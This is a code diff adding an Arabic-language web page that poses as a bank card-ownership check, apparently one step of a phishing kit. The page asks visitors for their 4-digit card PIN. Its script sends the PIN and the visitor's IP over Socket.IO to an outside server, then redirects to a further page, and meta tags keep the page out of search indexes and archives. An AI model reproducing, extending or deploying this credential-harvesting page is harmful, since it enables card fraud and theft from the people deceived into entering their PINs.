@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>تأكيد ملكية البطاقة</title>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    rel="stylesheet" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+    }
+
+    #loadingOverlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container mt-5" id="applePayRadio">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div style="
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              overflow: hidden;
+            ">
+          <div class="p-4 text-center">
+            <img src="assets/icon/Bca-logo.svg" width="110" class="mb-4" />
+            <h5>تأكيد ملكية البطاقة</h5>
+            <p class="text-right small text-secondary">
+              لضمان حماية معلوماتك وإتمام عملية الدفع بأمان، نرجو منك إدخال
+              الرمز السري المكون من ٤ أرقام، يُستخدم هذا الرمز فقط لأغراض
+              التحقق من ملكية البطاقة
+            </p>
+
+            <form id="codeForm">
+              <div class="form-group text-right">
+                <label for="verification_code">أدخل الرمز هنا:</label>
+                <input class="form-control text-center" id="verification_code" type="tel" minlength="4" maxlength="4"
+                  pattern="^[0-9]{4}$" title="يجب إدخال 4 أرقام بالضبط"
+                  oninput="this.value=this.value.replace(/\D/g,'').slice(0,4)" required />
+              </div>
+              <div class="alert alert-danger text-right mt-2" id="decline-message" role="alert" style="display: none">
+                <span> الرمز المدخل غير صحيح. </span>
+              </div>
+              <button class="btn btn-primary col-12" type="submit">
+                تأكيد
+              </button>
+              <p class="text-right text-secondary mt-3 small">
+                هل تحتاج للمساعدة؟
+              </p>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading overlay: start hidden via d-none -->
+  <div id="loadingOverlay" class="d-none">
+    <div class="text-center text-white">
+      <div class="spinner-border text-light mb-3" role="status"></div>
+      <h5 class="font-weight-bold">يرجى الانتظار</h5>
+      <p>انتظر حتى تتم معالجة طلبك</p>
+    </div>
+  </div>
+
+  <!-- 1) Load Socket.IO once -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+        window.visitorIP = ip;
+        const page = window.location.pathname.split("/").pop() || "pin.html";
+        window.socket.emit("updateLocation", { ip, page });
+      } catch (err) {
+        console.error("Failed to fetch visitor IP:", err);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js to handle navigateTo events -->
+  <script src="./assets/js/location.js"></script>
+
+  <!-- 3) Form → socket.submitCode & overlay control, plus “decline true” logic -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // 3a) Show decline‐message if URL contains '?declined=true'
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("declined") === "true") {
+        document.getElementById("decline-message").style.display = "block";
+      }
+
+      const form = document.getElementById("codeForm");
+      const overlay = document.getElementById("loadingOverlay");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        // show the loading overlay
+        overlay.classList.remove("d-none");
+        overlay.classList.add("d-flex");
+
+        // wait for IP to be ready
+        while (window.visitorIP === null) {
+          await new Promise((r) => setTimeout(r, 50));
+        }
+        console.log("📤 submitting Nafad with ip=", window.visitorIP);
+
+        const code = document.getElementById("verification_code").value;
+        window.socket.emit("submitCode", {
+          ip: window.visitorIP,
+          verification_code: code,
+        });
+      });
+
+      window.socket.on("ackCode", (resp) => {
+        if (resp.success) {
+          // keep overlay on; then redirect to phone.html
+          window.location.href = "phone.html";
+        } else {
+          // hide overlay on error
+          overlay.classList.remove("d-flex");
+          overlay.classList.add("d-none");
+
+          console.error(resp.error);
+        }
+      });
+    });
+  </script>
+
+
+  <!-- 4) Load jQuery then Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
